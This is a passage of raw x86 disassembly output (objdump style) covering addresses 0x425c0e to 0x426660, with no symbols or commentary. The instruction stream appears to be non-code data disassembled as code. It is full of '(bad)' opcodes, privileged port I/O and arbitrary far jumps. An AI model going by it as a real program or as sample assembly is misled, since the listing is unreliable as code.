  425c0e:	sbb    ah,BYTE PTR [edx+0x732cba61]
  425c14:	pop    ds
  425c15:	and    BYTE PTR [edx],bl
  425c17:	push   ds
  425c18:	sbb    BYTE PTR [edi+0x7c],0x8b
  425c1c:	ficomp WORD PTR [ecx+0x8b0eb9d]
  425c22:	inc    esp
  425c23:	sub    bl,BYTE PTR [esi-0x591771f8]
  425c29:	sti    
  425c2a:	int    0xe5
  425c2c:	dec    edx
  425c2d:	add    BYTE PTR [edx],cl
  425c2f:	push   ebp
  425c30:	xlat   BYTE PTR ds:[ebx]
  425c31:	add    al,0xa8
  425c33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425c34:	fcomp  st(1)
  425c36:	mov    ebp,0x3cdffa91
  425c3b:	pop    esi
  425c3c:	shr    BYTE PTR [ebp+0x75],1
  425c3f:	jno    0x425cc0
  425c41:	outs   dx,DWORD PTR ds:[esi]
  425c42:	sbb    cl,bl
  425c44:	aam    0x47
  425c46:	xor    ebx,0x63
  425c49:	aad    0xbd
  425c4b:	or     al,BYTE PTR [ecx]
  425c4d:	repz and BYTE PTR [edi-0x3a],0xa3
  425c52:	inc    ecx
  425c53:	inc    eax
  425c54:	in     al,0xab
  425c56:	pop    esi
  425c57:	dec    esp
  425c58:	sbb    eax,0x1b6d1546
  425c5d:	xchg   BYTE PTR [ecx-0x38cbe957],bl
  425c63:	xchg   ecx,eax
  425c64:	and    DWORD PTR [ebp-0x4b93ab8b],esi
  425c6a:	enter  0xd54,0x5a
  425c6e:	jmp    0x425c22
  425c70:	jp     0x425cee
  425c72:	enter  0x6f44,0x4c
  425c76:	pop    esp
  425c77:	add    al,0x1
  425c79:	popa   
  425c7a:	cmp    esi,DWORD PTR [ebp+0x69]
  425c7d:	mov    DWORD PTR [edi],ebp
  425c7f:	js     0x425c81
  425c81:	pusha  
  425c82:	xchg   esp,eax
  425c83:	pop    edx
  425c84:	call   0x1251:0xb986d537
  425c8b:	fild   WORD PTR [edx+0x6203ab5]
  425c91:	ror    DWORD PTR [ecx+ecx*1-0x1e],0x1e
  425c96:	fild   WORD PTR [ebx+0x41]
  425c99:	js     0x425c59
  425c9b:	es cmp eax,0x7afcc22b
  425ca1:	fs push eax
  425ca3:	pop    ds
  425ca4:	xor    al,0xc
  425ca6:	add    ch,BYTE PTR [ebx]
  425ca8:	xchg   esi,eax
  425ca9:	fcomp  QWORD PTR [ebx]
  425cab:	rcl    ecx,1
  425cad:	repz js 0x425c3a
  425cb0:	xlat   BYTE PTR ds:[ebx]
  425cb1:	popa   
  425cb2:	cs in  al,dx
  425cb4:	test   BYTE PTR [eax],al
	...
  425d16:	jmp    FWORD PTR [esp+ebx*8-0x8820f9]
  425d1d:	cld    
  425d1e:	fidiv  DWORD PTR [esi+0xd]
  425d21:	in     al,0x92
  425d23:	loope  0x425d65
  425d25:	mov    ebp,0x19326
  425d2a:	pop    es
  425d2b:	add    DWORD PTR [eax],eax
  425d2d:	add    BYTE PTR [ebp+0x47d69e33],dl
  425d33:	je     0x425cf7
  425d35:	cmp    al,0x9d
  425d37:	cdq    
  425d38:	xlat   BYTE PTR ds:[ebx]
  425d39:	std    
  425d3a:	push   ecx
  425d3b:	dec    edi
  425d3c:	sbb    dl,BYTE PTR [ebx+0x8]
  425d3f:	jns    0x425d0d
  425d41:	pop    esi
  425d42:	xor    DWORD PTR [ebp-0x31],esi
  425d45:	cmp    bl,ch
  425d47:	push   ebx
  425d48:	cmp    eax,0x706f563d
  425d4d:	adc    BYTE PTR [edx+0x41],ch
  425d50:	fdivr  st,st(0)
  425d52:	(bad)  
  425d53:	jae    0x425dc9
  425d55:	outs   dx,BYTE PTR ds:[esi]
  425d56:	mov    ds:0x6ac3eff6,al
  425d5b:	aas    
  425d5c:	bsf    ebx,DWORD PTR [esi]
  425d5f:	xchg   dl,bl
  425d61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425d62:	sbb    al,dh
  425d64:	sub    eax,0x1418975
  425d69:	shr    eax,1
  425d6b:	jne    0x425d14
  425d6d:	cmp    DWORD PTR [edx+0x3bc439ba],eax
  425d73:	arpl   WORD PTR [edx+0x39351adc],cx
  425d79:	mov    esp,DWORD PTR [ebx]
  425d7b:	pop    ecx
  425d7c:	push   eax
  425d7d:	or     esp,esi
  425d7f:	pop    es
  425d80:	jmp    0x5839b0df
  425d85:	jg     0x425df7
  425d87:	or     eax,0xf09ab913
  425d8c:	lahf   
  425d8d:	mov    ebx,0xe0e57d7c
  425d92:	fcomi  st,st(1)
  425d94:	data16 out 0xaf,al
  425d97:	fsub   DWORD PTR [esi]
  425d99:	mov    cl,0x77
  425d9b:	js     0x425d5e
  425d9d:	fisttp WORD PTR [ebx+0x6]
  425da0:	inc    ebx
  425da1:	lods   al,BYTE PTR ds:[esi]
  425da2:	dec    ebx
  425da3:	fistp  WORD PTR [esi-0x40]
  425da6:	and    al,0x14
  425da8:	call   0x692e:0x8af98757
  425daf:	push   ss
  425db0:	repz pop eax
  425db2:	sbb    al,0xdb
  425db4:	out    dx,eax
  425db5:	lahf   
  425db6:	mov    eax,0xc72428b3
  425dbb:	xor    dl,BYTE PTR [edx]
  425dbd:	arpl   WORD PTR [edx+0x30],si
  425dc0:	jae    0x425e39
  425dc2:	add    DWORD PTR [edx+0x744f5474],eax
  425dc8:	cmp    edx,DWORD PTR [edx+0x50]
  425dcb:	cmp    edi,0x28
  425dce:	adc    eax,DWORD PTR [ebp-0x7e]
  425dd1:	add    al,0xd0
  425dd3:	xchg   BYTE PTR [ebp+0x2900452d],al
  425dd9:	es sub ah,0xe0
  425ddd:	cmp    eax,DWORD PTR [eax]
  425ddf:	ret    
  425de0:	adc    eax,0xb4ff1ea7
  425de5:	push   esi
  425de6:	mov    edi,0xaf7b2750
  425deb:	retf   
  425dec:	and    al,0xb
  425dee:	xchg   ecx,eax
  425def:	dec    edx
  425df0:	les    ebx,FWORD PTR [edi+0x19]
  425df3:	sub    BYTE PTR [edx],dl
  425df5:	sbb    DWORD PTR ds:0x82528448,esi
  425dfb:	pop    ds
  425dfc:	and    DWORD PTR [esp+ebp*8],eax
  425dff:	aam    0xc9
  425e01:	xadd   bh,dl
  425e04:	mov    esi,fs
  425e06:	sub    eax,0xea0e0f37
  425e0b:	mov    esp,ds
  425e0d:	xchg   DWORD PTR [edx],esi
  425e0f:	repnz iret 
  425e11:	add    esi,DWORD PTR [edx]
  425e13:	mov    BYTE PTR [ecx],bh
  425e15:	shr    BYTE PTR [eax+0x3708fe2f],0x34
  425e1c:	cmp    DWORD PTR [edi],edx
  425e1e:	retf   0x1720
  425e21:	sbb    BYTE PTR [edx+0x25643685],cl
  425e27:	clc    
  425e28:	xchg   edi,eax
  425e29:	out    dx,eax
  425e2a:	pushf  
  425e2b:	push   0xf9fb2016
  425e30:	sub    BYTE PTR [eax+0xbefb07],al
	...
  425e96:	(bad)  
  425e97:	jl     0x425eea
  425e99:	sar    bl,1
  425e9b:	std    
  425e9c:	(bad)  
  425e9d:	jle    0x425ea2
  425e9f:	test   BYTE PTR [edi],0xb2
  425ea2:	cmp    al,0x72
  425ea5:	sub    BYTE PTR ds:0x7000194,0x1
  425eac:	add    BYTE PTR [eax],al
  425eae:	and    DWORD PTR [edx-0x5f89fc39],esp
  425eb4:	stos   BYTE PTR es:[edi],al
  425eb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425eb6:	je     0x425e80
  425eb8:	aam    0x8e
  425eba:	push   edi
  425ebb:	cmp    eax,0xc2d3bad4
  425ec0:	stos   BYTE PTR es:[edi],al
  425ec1:	hlt    
  425ec2:	and    DWORD PTR [ebp-0x2005718d],ebx
  425ec8:	pop    es
  425ec9:	les    edx,FWORD PTR [ebx]
  425ecb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425ecc:	ret    0x69ef
  425ecf:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  425ed1:	xor    eax,0x8c2bb3f2
  425ed6:	shl    ah,1
  425ed8:	mov    bl,0xf0
  425eda:	stos   BYTE PTR es:[edi],al
  425edb:	sbb    bh,BYTE PTR [esi+0x2a]
  425ede:	jl     0x425ed1
  425ee0:	pop    eax
  425ee1:	lods   eax,DWORD PTR ds:[esi]
  425ee2:	pop    ebx
  425ee3:	in     eax,0x1d
  425ee5:	call   0x47aa:0x95068a22
  425eec:	shl    BYTE PTR [ebp-0x7d],cl
  425eef:	add    edx,DWORD PTR [edx]
  425ef1:	push   0x849b85e4
  425ef6:	iret   
  425ef7:	sahf   
  425ef8:	sub    eax,0xfb3c5c06
  425efd:	inc    eax
  425efe:	popa   
  425eff:	jge    0x425f03
  425f01:	std    
  425f02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425f03:	mov    esi,0x2b8ac9ac
  425f08:	xor    dl,al
  425f0a:	je     0x425f6f
  425f0c:	data16 mov al,0xd
  425f0f:	inc    esp
  425f10:	mov    ah,0x6e
  425f12:	retf   0x4004
  425f15:	out    dx,eax
  425f16:	xor    al,0x95
  425f18:	xor    dl,BYTE PTR [esi+0x7c6abf80]
  425f1e:	mov    eax,ds:0xed97aef2
  425f23:	(bad)  
  425f24:	sbb    bl,BYTE PTR [ebx-0x2c71ce76]
  425f2a:	xchg   ebx,eax
  425f2b:	add    al,0x2
  425f2d:	xchg   DWORD PTR [edi+0x39],esi
  425f30:	sahf   
  425f31:	jno    0x425f0d
  425f33:	mov    ds:0x453a56c4,al
  425f38:	lea    edi,[ebp-0x4c]
  425f3b:	xor    al,0xde
  425f3d:	xor    al,0x75
  425f3f:	adc    BYTE PTR [ebx],dh
  425f41:	inc    ebp
  425f42:	fdivr  st,st(5)
  425f44:	add    al,0xcc
  425f46:	loope  0x425fbf
  425f48:	fistp  WORD PTR [ecx]
  425f4a:	cmp    esi,0xffffff9c
  425f4d:	add    eax,0x1a3e882a
  425f52:	loope  0x425f9f
  425f54:	xor    eax,0x5b7ed6f0
  425f5a:	inc    ecx
  425f5b:	je     0x425f58
  425f5d:	mov    ss,WORD PTR [ebp+edi*2-0x28]
  425f61:	(bad)  
  425f64:	jle    0x425f81
  425f66:	ja     0x425f08
  425f68:	jae    0x425f8a
  425f6a:	jmp    0xff4b6a46
  425f6f:	jmp    0x93ab0c01
  425f74:	enter  0x5de1,0xc0
  425f78:	mov    ch,0xa2
  425f7a:	dec    edi
  425f7b:	fwait
  425f7c:	aad    0x72
  425f7e:	mov    ebx,0xd2cab77a
  425f83:	add    al,0x2a
  425f85:	add    BYTE PTR [edx],ah
  425f87:	fstp   TBYTE PTR [esi*1-0x54c5f689]
  425f8e:	dec    ecx
  425f8f:	pop    ebx
  425f90:	adc    DWORD PTR [ecx+ecx*1+0x31],ebp
  425f94:	push   cs
  425f95:	data16 or al,0xaa
  425f98:	add    ah,dh
  425f9a:	lods   al,BYTE PTR ds:[esi]
  425f9b:	sub    eax,0xac45817b
  425fa0:	shr    BYTE PTR [ebx+0x4],0x2c
  425fa4:	es ins BYTE PTR es:[edi],dx
  425fa6:	mov    esi,0x3645be57
  425fab:	out    dx,al
  425fac:	hlt    
  425fad:	sbb    bl,bh
  425faf:	fs adc ebx,eax
  425fb2:	stos   BYTE PTR es:[edi],al
  425fb3:	aaa    
  425fb4:	dec    ebp
	...
  426015:	add    BYTE PTR [ecx],bh
  426017:	cwde   
  426018:	or     eax,DWORD PTR [esi]
  42601a:	stos   DWORD PTR es:[edi],eax
  42601b:	xchg   edi,eax
  42601c:	cmp    eax,0x791073bf
  426021:	mov    esi,0xf322c62
  426026:	xor    al,0x95
  426028:	add    DWORD PTR [eax],eax
  42602a:	pop    es
  42602b:	add    DWORD PTR [eax],eax
  42602d:	add    BYTE PTR [edi-0x1a],cl
  426030:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426031:	fist   WORD PTR [esi]
  426033:	inc    esp
  426034:	mov    edx,0xbb608bff
  426039:	pop    edx
  42603a:	add    bh,ah
  42603c:	retf   0x9da9
  42603f:	jbe    0x42603b
  426041:	retf   
  426042:	mov    ecx,0x3753e305
  426047:	pushfw 
  426049:	pop    ebx
  42604a:	test   DWORD PTR [edx-0x710eb761],edx
  426050:	int3   
  426051:	push   ds
  426052:	jb     0x42609b
  426054:	sbb    eax,0x21b1a190
  426059:	xchg   edx,eax
  42605a:	mov    ecx,esp
  42605c:	cmp    bh,bh
  42605e:	test   al,0x44
  426060:	push   es
  426061:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  426063:	sbb    eax,0x1a21cb00
  426068:	dec    esi
  426069:	sub    eax,0xef58835c
  42606e:	cld    
  42606f:	jl     0x42603d
  426071:	icebp  
  426072:	dec    eax
  426073:	dec    eax
  426074:	jno    0x4260cd
  426076:	pop    eax
  426077:	xor    al,0x22
  426079:	repz or esp,esp
  42607c:	or     DWORD PTR [edx+edx*8-0x2420402c],edx
  426083:	fs dec ebp
  426085:	nop
  426086:	dec    ecx
  426087:	(bad)  
  426088:	sub    al,0x5c
  42608a:	loope  0x4260be
  42608c:	shl    DWORD PTR [esi-0x4132d222],0x87
  426093:	gs aad 0x68
  426096:	rol    BYTE PTR [esi+0x1e84c901],1
  42609c:	mov    al,ds:0xbbfbd510
  4260a1:	xor    al,0xd7
  4260a3:	sbb    al,0x11
  4260a5:	xor    eax,0x430b893c
  4260aa:	arpl   WORD PTR [esi+0x34],sp
  4260ad:	push   esp
  4260ae:	xchg   ecx,eax
  4260af:	inc    esp
  4260b0:	mov    bl,0xd2
  4260b2:	cwde   
  4260b3:	add    ecx,DWORD PTR [edx-0x4b]
  4260b6:	jmp    0x4260eb
  4260b8:	xor    DWORD PTR [ebx+0x64bc1223],esi
  4260be:	cmp    edi,esi
  4260c0:	jo     0x4260ba
  4260c2:	(bad)  
  4260c3:	mov    ecx,0x83df1e4c
  4260c8:	add    eax,0x9fe28cef
  4260cd:	popa   
  4260ce:	(bad)  
  4260cf:	in     eax,0x99
  4260d1:	in     al,dx
  4260d2:	xchg   DWORD PTR [ecx+0x10],edx
  4260d5:	mov    cl,0xc4
  4260d7:	mov    eax,0xd3c8e4b0
  4260dc:	xchg   ebx,eax
  4260dd:	int3   
  4260de:	in     al,dx
  4260df:	pop    ds
  4260e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4260e1:	inc    esi
  4260e2:	test   BYTE PTR [ebx+0x1c],bl
  4260e5:	mov    al,ds:0x809745c
  4260ea:	faddp  st(7),st
  4260ec:	rol    BYTE PTR [ebx-0x6591876d],0xcc
  4260f3:	push   ss
  4260f4:	pop    esi
  4260f5:	or     ebx,DWORD PTR [esi-0xd]
  4260f8:	sbb    BYTE PTR [eax-0x5d],dh
  4260fb:	sub    eax,0x562ec086
  426100:	xor    dl,bh
  426102:	or     ch,cl
  426104:	daa    
  426105:	mov    ds:0x52c9762d,al
  42610a:	xor    dl,BYTE PTR [ecx+0x5dae9673]
  426110:	add    ebx,DWORD PTR [ebp-0x4db6f8b1]
  426116:	stos   BYTE PTR es:[edi],al
  426117:	gs mov esp,0x9b2a579a
  42611d:	push   edx
  42611e:	test   BYTE PTR [edi+0x1b],bh
  426121:	(bad)
  426124:	and    BYTE PTR [ebp+0x2df81753],dh
  42612a:	int3   
  42612b:	enter  0x3731,0x10
  42612f:	mov    eax,0x9e8c0ac4
  426134:	daa    
	...
  426195:	add    BYTE PTR [ebx-0x409ef0df],bl
  42619b:	outs   dx,DWORD PTR ds:[esi]
  42619c:	(bad)  
  42619d:	sti    
  42619e:	outs   dx,DWORD PTR ds:[esi]
  42619f:	sub    BYTE PTR [ebx-0x5380807d],bh
  4261a5:	pop    esp
  4261a6:	cmp    edx,DWORD PTR [esi+0x1070001]
  4261ac:	add    BYTE PTR [eax],al
  4261ae:	cmp    BYTE PTR [eax],cl
  4261b0:	jo     0x426199
  4261b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4261b3:	xchg   edi,eax
  4261b4:	lahf   
  4261b5:	cmp    al,0x40
  4261b7:	repz mov esp,0x84e8cde7
  4261bd:	add    esp,DWORD PTR [ecx+0x2b3f4a5a]
  4261c3:	mov    ds:0x1b6cba1b,al
  4261c8:	push   cs
  4261c9:	stos   BYTE PTR es:[edi],al
  4261ca:	icebp  
  4261cb:	mov    DWORD PTR [eax+esi*2+0x3b18db1a],esi
  4261d2:	shr    BYTE PTR [edx],cl
  4261d4:	aad    0xcc
  4261d6:	mov    DWORD PTR [eax+ecx*1],ecx
  4261d9:	and    BYTE PTR [edx-0x31da9e55],bl
  4261df:	mov    fs,WORD PTR [ebp+0x1d12b75d]
  4261e5:	jo     0x4261d1
  4261e7:	in     eax,dx
  4261e8:	or     BYTE PTR [edi+eax*1+0x29],cl
  4261ec:	je     0x42624a
  4261ee:	mov    ds:0x52da4564,eax
  4261f3:	popa   
  4261f4:	outs   dx,DWORD PTR ds:[esi]
  4261f5:	sbb    bh,BYTE PTR [edi]
  4261f7:	rcl    DWORD PTR ds:0x52afec82,cl
  4261fd:	into   
  4261fe:	sub    eax,0x94715edb
  426203:	mov    eax,ds:0x7d8c8746
  426208:	loopne 0x42624e
  42620a:	pop    ds
  42620b:	sub    al,0x1
  42620d:	sub    al,0x86
  42620f:	dec    esp
  426210:	scas   al,BYTE PTR es:[edi]
  426211:	test   BYTE PTR [edi],bh
  426213:	fisttp DWORD PTR [ecx+edi*1+0xb50a971]
  42621a:	and    ecx,0xc2073ca9
  426220:	fild   QWORD PTR [eax]
  426222:	retf   
  426223:	add    DWORD PTR [ebx+edx*1-0x6022d5fc],ebx
  42622a:	add    DWORD PTR [esi],ebx
  42622c:	sahf   
  42622d:	out    dx,eax
  42622e:	dec    edi
  42622f:	pop    edi
  426230:	jne    0x4261fe
  426232:	mov    al,0xca
  426234:	mov    ds:0x2d5e486,al
  426239:	xor    ebp,eax
  42623b:	jl     0x4262bb
  42623d:	in     al,0x3f
  42623f:	lods   eax,DWORD PTR ds:[esi]
  426240:	fsubrp st(5),st
  426242:	xor    BYTE PTR [eax+0x23],ah
  426245:	jg     0x42625a
  426247:	mov    al,0xeb
  426249:	push   edi
  42624a:	aas    
  42624b:	(bad)  
  42624c:	clc    
  42624d:	xor    DWORD PTR [eax+eiz*4+0x36],ebx
  426251:	push   0xde7c781e
  426256:	or     al,0xd6
  426258:	loopne 0x4262d1
  42625a:	shl    al,cl
  42625c:	mov    edx,0x7e9a05f8
  426261:	mov    al,0xde
  426263:	push   0xb2d270af
  426268:	cmp    eax,0x24b4c9fb
  42626d:	or     eax,0x4f2d11d
  426272:	xor    BYTE PTR [ebx+ebx*8],0x30
  426276:	pop    ecx
  426277:	outs   dx,DWORD PTR ds:[esi]
  426278:	or     DWORD PTR [ebx],0x88268546
  42627e:	lea    eax,ds:0x14625daa
  426284:	test   al,0x88
  426286:	add    eax,DWORD PTR [edx]
  426288:	iret   
  426289:	aaa    
  42628a:	sar    DWORD PTR [ebx+0xcb30b7f],cl
  426290:	xor    al,0x9b
  426292:	pop    ebx
  426293:	and    eax,0x52fdb2c1
  426298:	sbb    bh,BYTE PTR [ebp+edx*8+0x24]
  42629c:	push   edx
  42629d:	loope  0x42628f
  42629f:	fcmovnb st,st(0)
  4262a1:	(bad)  
  4262a2:	in     eax,0xb0
  4262a4:	leave  
  4262a5:	ret    
  4262a6:	in     eax,0x31
  4262a8:	pusha  
  4262a9:	scas   eax,DWORD PTR es:[edi]
  4262aa:	enter  0x7585,0x29
  4262ae:	data16 ficom DWORD PTR [ecx+eax*4]
  4262b2:	bt     DWORD PTR [eax+0x0],ebx
	...
  426315:	add    BYTE PTR [ebp+eiz*1-0x73],dl
  426319:	dec    esi
  42631a:	std    
  42631b:	out    dx,al
  42631c:	xlat   BYTE PTR ds:[ebx]
  42631d:	aas    
  42631e:	ins    BYTE PTR es:[edi],dx
  42631f:	lods   al,BYTE PTR ds:[esi]
  426320:	ret    0x2154
  426323:	shl    DWORD PTR [ebx+0x19742af],0x0
  42632a:	pop    es
  42632b:	add    DWORD PTR [eax],eax
  42632d:	add    dl,dh
  42632f:	pop    ebp
  426330:	and    BYTE PTR [ecx],bl
  426332:	sbb    BYTE PTR [edx-0x64],ch
  426335:	clc    
  426336:	idiv   DWORD PTR [esi]
  426338:	push   ecx
  426339:	inc    ebx
  42633a:	mov    ebx,gs
  42633c:	enter  0xb527,0x98
  426340:	and    eax,0xb826cec9
  426345:	push   ebx
  426346:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426347:	fcmovne st,st(1)
  426349:	pop    ecx
  42634a:	xor    al,0x53
  42634c:	ss rcr bh,1
  42634f:	push   ebx
  426350:	xlat   BYTE PTR ds:[ebx]
  426351:	jmp    0x872d32ce
  426356:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426357:	xor    BYTE PTR [ebx-0x441b98a7],dh
  42635d:	int    0xc3
  42635f:	stos   DWORD PTR es:[edi],eax
  426360:	jl     0x426303
  426362:	rcl    edx,0x76
  426365:	stos   DWORD PTR es:[edi],eax
  426366:	aas    
  426367:	pop    es
  426368:	mov    esp,DWORD PTR [eax+ebp*2+0x2f]
  42636c:	pushf  
  42636d:	or     BYTE PTR [esi-0x29092992],0x5e
  426374:	xor    eax,esp
  426376:	shl    bl,cl
  426378:	add    al,0xac
  42637a:	in     eax,0x1e
  42637c:	aad    0x47
  42637e:	sahf   
  42637f:	inc    ebx
  426380:	mov    bl,0x55
  426382:	cmp    edx,DWORD PTR [esi]
  426384:	out    dx,eax
  426385:	cdq    
  426386:	arpl   WORD PTR [ecx-0x1a],bx
  426389:	rcl    BYTE PTR [eax+0x505b966c],1
  42638f:	mov    bl,0x56
  426391:	fs fwait
  426393:	stc    
  426394:	psubw  mm2,QWORD PTR [esp+esi*1-0x12]
  426399:	mov    ah,0x59
  42639b:	nop
  42639c:	aam    0x58
  42639e:	and    ebp,DWORD PTR [edi]
  4263a0:	ja     0x426368
  4263a2:	mov    WORD PTR [eax],es
  4263a4:	in     al,0x66
  4263a6:	sub    al,0x14
  4263a8:	inc    ecx
  4263a9:	push   edi
  4263aa:	scas   al,BYTE PTR es:[edi]
  4263ab:	fwait
  4263ac:	pop    edx
  4263ad:	mov    al,BYTE PTR [ebx+0x30cdcb31]
  4263b3:	imul   edx,DWORD PTR [ebp*8+0x2e990c82],0xffffff95
  4263bb:	scas   al,BYTE PTR es:[edi]
  4263bc:	mov    al,0xd3
  4263be:	mov    ebx,0x85631c70
  4263c3:	pop    eax
  4263c4:	lock cmc 
  4263c6:	dec    esp
  4263c7:	lock push 0x8aeee3ad
  4263cd:	fild   DWORD PTR [edx+0x4]
  4263d0:	cwde   
  4263d1:	test   eax,ebx
  4263d3:	shl    BYTE PTR [ebx+0x2b],cl
  4263d6:	jae    0x4263f9
  4263d8:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4263da:	mov    ebx,DWORD PTR [edi]
  4263dc:	call   DWORD PTR [edx]
  4263de:	(bad)  
  4263df:	and    ebp,DWORD PTR [ecx+0x106bfdb0]
  4263e5:	mov    eax,ds:0xcd97efed
  4263ea:	fst    DWORD PTR [ebx-0x4]
  4263ed:	mov    ds,eax
  4263ef:	daa    
  4263f0:	int3   
  4263f1:	outs   dx,DWORD PTR ds:[esi]
  4263f2:	test   dh,al
  4263f4:	ret    
  4263f5:	or     DWORD PTR [esi+0x338b9e07],0xffffffc9
  4263fc:	out    0xa5,eax
  4263fe:	fisttp DWORD PTR [edx-0x5d]
  426401:	add    eax,eax
  426403:	add    eax,DWORD PTR [ebp+0x646426a8]
  426409:	lea    edi,[esi-0x5974debb]
  42640f:	jae    0x426450
  426411:	inc    esi
  426412:	sbb    ah,BYTE PTR [edx-0x9]
  426415:	cmp    DWORD PTR [esi+0x28],0xc60116af
  42641c:	(bad)  
  42641d:	das    
  42641e:	xor    DWORD PTR [edx],edx
  426420:	xor    al,0xce
  426422:	ss xchg edi,eax
  426424:	push   edx
  426425:	or     BYTE PTR [ebx+0x5c],0x13
  426429:	and    edi,DWORD PTR [edx+0x61]
  42642c:	sbb    eax,0xb3cfb5c4
  426431:	jmp    0x0:0xd274f8
	...
  426494:	add    BYTE PTR [eax],al
  426496:	imul   ebp,DWORD PTR [edi-0x78],0xe9ef8e08
  42649d:	outs   dx,DWORD PTR ds:[esi]
  42649e:	(bad)  
  42649f:	fistp  QWORD PTR [edx+0x4c]
  4264a2:	dec    ebx
  4264a3:	test   BYTE PTR [ecx+edi*1+0x19849],cl
  4264aa:	pop    es
  4264ab:	add    DWORD PTR [eax],eax
  4264ad:	add    al,dh
  4264af:	jg     0x426493
  4264b1:	jg     0x426479
  4264b3:	lds    edx,FWORD PTR [edi]
  4264b5:	fcmovne st,st(4)
  4264b7:	std    
  4264b8:	jmp    0xb067:0x767b0d5b
  4264bf:	retf   0x6381
  4264c2:	les    esp,FWORD PTR [edi-0x4a3dbfc2]
  4264c8:	mov    dl,0xbd
  4264ca:	xchg   ecx,eax
  4264cb:	scas   eax,DWORD PTR es:[edi]
  4264cc:	inc    eax
  4264cd:	sbb    BYTE PTR [edi+0x6f37b5b7],dl
  4264d3:	shl    BYTE PTR [esi+0x7af30f15],0xe1
  4264da:	xchg   esi,eax
  4264db:	test   eax,0xed061a63
  4264e0:	add    DWORD PTR [ecx],esp
  4264e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4264e3:	sub    BYTE PTR [edx-0x2bb6cfef],ah
  4264e9:	daa    
  4264ea:	xchg   DWORD PTR [edi+0x23],ecx
  4264ed:	sbb    ebx,eax
  4264ef:	adc    edi,esp
  4264f1:	jnp    0x426474
  4264f3:	(bad)  
  4264f4:	popa   
  4264f5:	int    0x5e
  4264f7:	ret    0xc444
  4264fa:	jnp    0x42654e
  4264fc:	pushf  
  4264fd:	jae    0x426504
  4264ff:	sub    ecx,DWORD PTR [ecx+0x69]
  426502:	aam    0xd8
  426504:	mov    esp,0x7480ba59
  426509:	mov    dl,0xfb
  42650b:	dec    esp
  42650c:	adc    DWORD PTR [ebp+0x44],ecx
  42650f:	or     DWORD PTR [esi],0xffffffc8
  426512:	retf   0x9411
  426515:	int    0xa2
  426517:	mov    cl,0x34
  426519:	das    
  42651a:	add    eax,DWORD PTR [ecx]
  42651c:	popa   
  42651d:	inc    esp
  42651e:	add    ah,al
  426520:	ds in  al,dx
  426522:	mov    eax,ds:0xa5e600c6
  426527:	pop    edx
  426528:	stc    
  426529:	xor    ecx,DWORD PTR [ebx]
  42652b:	sub    DWORD PTR [ebx+0x4104105a],esi
  426531:	lahf   
  426532:	js     0x426536
  426534:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426535:	jmp    0x2373d8ca
  42653a:	and    eax,0xcc960513
  42653f:	or     DWORD PTR [edx-0x7e16e396],0x43
  426546:	int3   
  426547:	jo     0x42650f
  426549:	mov    ds:0xb7a51660,eax
  42654e:	iret   
  42654f:	and    al,0xc6
  426551:	or     ecx,DWORD PTR [ecx]
  426553:	cdq    
  426554:	in     al,dx
  426555:	add    BYTE PTR [esi-0x73],bl
  426558:	add    edi,DWORD PTR ds:0xfc6eebac
  42655e:	inc    ecx
  42655f:	pop    ecx
  426560:	aas    
  426561:	stos   DWORD PTR es:[edi],eax
  426562:	not    BYTE PTR [edx]
  426564:	scas   eax,DWORD PTR es:[edi]
  426565:	dec    ebp
  426566:	and    esi,esp
  426568:	xor    al,0xbd
  42656a:	jo     0x4264f4
  42656c:	hlt    
  42656d:	out    0x33,al
  42656f:	xchg   ebx,eax
  426570:	jne    0x426520
  426572:	inc    ebp
  426573:	mov    bh,0xf6
  426575:	sbb    edx,DWORD PTR es:[edi]
  426578:	xchg   DWORD PTR [edi],edi
  42657a:	xor    cl,ch
  42657c:	mov    eax,0x2434d738
  426581:	mov    ah,0xc2
  426583:	cmp    BYTE PTR [ebx],bl
  426585:	jno    0x42653e
  426587:	cmp    al,0x54
  426589:	mov    ecx,0x220dbd3c
  42658e:	pop    ss
  42658f:	(bad)  
  426590:	popf   
  426591:	mov    edx,0xa63e9845
  426596:	mov    al,0x60
  426598:	stc    
  426599:	add    BYTE PTR [edx+edx*4-0x58431a55],cl
  4265a0:	mov    WORD PTR [eax],gs
  4265a2:	xchg   ebp,eax
  4265a3:	add    bl,BYTE PTR [eax+0x6f]
  4265a6:	dec    ecx
  4265a7:	mov    dh,0xc4
  4265a9:	sbb    esp,DWORD PTR [edx+0x35]
  4265ac:	sbb    DWORD PTR [edx],ecx
  4265ae:	mov    edx,0xb89dddcf
  4265b3:	inc    ecx
  4265b4:	mov    DWORD PTR [eax],eax
	...
  426616:	adc    cl,bl
  426618:	sbb    DWORD PTR [edx],0xcb9b5ad9
  42661e:	xor    DWORD PTR [ecx+0x6f],0x2f
  426622:	add    BYTE PTR [esi-0x66aff26f],dl
  426628:	add    DWORD PTR [eax],eax
  42662a:	pop    es
  42662b:	add    DWORD PTR [eax],eax
  42662d:	add    bh,cl
  42662f:	pop    esi
  426630:	aam    0xf6
  426632:	(bad)  
  426633:	mov    eax,0x5337b87b
  426638:	jg     0x42660c
  42663a:	in     al,0x1a
  42663c:	push   cs
  42663d:	mov    ecx,0x3cde4145
  426642:	pop    ss
  426643:	dec    edx
  426644:	clc    
  426645:	repnz add DWORD PTR [esi+0x7d],esp
  426649:	inc    edx
  42664a:	lods   eax,DWORD PTR ds:[esi]
  42664b:	fucomi st,st(4)
  42664d:	push   eax
  42664e:	pop    edi
  42664f:	in     al,0xed
  426651:	push   es
  426652:	mov    ds:0x1c3bdefc,eax
  426657:	mov    al,ds:0x62a128a4
  42665c:	cmc    
  42665d:	pop    edi
  42665e:	sahf   
  42665f:	push   ss
  426660:	xor    BYTE PTR [esi+0x3903ce03],0x4e
